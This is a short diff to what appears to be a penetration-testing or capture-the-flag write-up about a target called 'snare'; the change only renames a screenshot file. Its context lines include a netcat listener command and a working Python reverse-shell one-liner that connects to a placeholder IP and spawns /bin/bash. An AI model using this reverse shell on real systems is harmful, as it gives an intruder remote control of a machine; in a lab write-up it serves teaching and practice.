@@ -147,7 +147,7 @@ Boom RCE confirm, replace `id` in the above with the below and run `nc-lvpn 4000
 python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<ip>",4000));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
 ```
 ![image](/images/articles/snare/rev_shell.png)
-![image](/images/articles/snare/rev2_shell.png)
+![image](/images/articles/snare/rev_shell2.png)
 
 * * *
 
